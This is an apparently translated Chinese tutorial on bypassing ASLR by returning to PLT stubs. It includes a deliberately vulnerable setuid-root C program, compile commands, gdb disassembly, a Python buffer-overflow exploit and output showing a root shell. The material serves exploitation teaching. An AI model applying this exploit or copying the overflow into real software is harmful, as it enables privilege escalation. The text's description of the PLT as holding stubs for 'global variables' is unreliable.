## Bypassing ASLR using return-to-plt

​	地址空间布局随机化（ASLR）是一种漏洞利用缓解技术，可随机化栈地址、堆地址和共享库地址。一旦上述地址被随机化，特别是共享库地址被随机化时，前面绕过NX位的方法将不起作用，因为攻击者需要知道libc库的基地址。

​	return-to-plt技术并非返回到libc函数地址（其地址是随机的），而是返回到函数的PLT（其地址不是随机的，执行前已知）。由于`"function@PLT"`不是随机的，攻击者不需要预测libc的基地址，而是可以直接地返回到`"function@PLT"`来调用`"function"`。

​	PLT(程序链接表)：程序链接表包含每个全局变量的存根代码。共享库文本段中的调用指令不直接调用函数"function", 而是调用存根代码"function@PLT"。该存根代码在动态链接器的帮助下解析函数地址并将其复制到GOT(全局偏移表)中。此解析仅在第一次调用函数时发生，之后代码段中的调用指令调用存根代码"function@PLT"来解析函数地址，存根代码直接从GOT中获取函数地址并跳转。因此这种方式是两级间接重定位函数地址。

​	因此，攻击者不需要确切的libc函数地址来调用libc函数，而是可以使用"function@PLT"地址来调用目标函数。

​	存在漏洞的代码：

```c
# include <stdio.h>
# include <string.h>

void shell() {
	system("/bin/sh");
 	exit(0);
}

int main(int argc, char* argv[]) {
 	int i=0;
 	char buf[256];
 	strcpy(buf,argv[1]);
 	printf("%s\n",buf);
 	return 0;
}
```

​	编译代码(~~禁用ASLR~~；关闭栈保护；~~标记堆栈为可执行~~；ELF文件执行时获得root权限)：

```shell
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -g -fno-stack-protector -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```

​	反汇编vuln可执行文件，可以看到`"system@PLT"`和`"exit@PLT"`的地址。

```
(gdb) disassemble shell
Dump of assembler code for function shell:
   0x08048474 <+0>:	push   %ebp
   0x08048475 <+1>:	mov    %esp,%ebp
   0x08048477 <+3>:	sub    $0x18,%esp
   0x0804847a <+6>:	movl   $0x80485b0,(%esp)
   0x08048481 <+13>:	call   0x8048380 <system@plt>
   0x08048486 <+18>:	movl   $0x0,(%esp)
   0x0804848d <+25>:	call   0x80483a0 <exit@plt>
End of assembler dump.
```

​	编写漏洞利用代码：

```python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

system = 0x8048380
exit = 0x80483a0
system_arg = 0x80485b5     # "sh" string address

#endianess convertion
def conv(num):
      return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 272
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print "Calling vulnerable program"
call(["./vuln", buf])
```

​	执行上述exploit，得到了root shell：

```
user@ubuntu:~/projects$ python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������
# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(user)
```

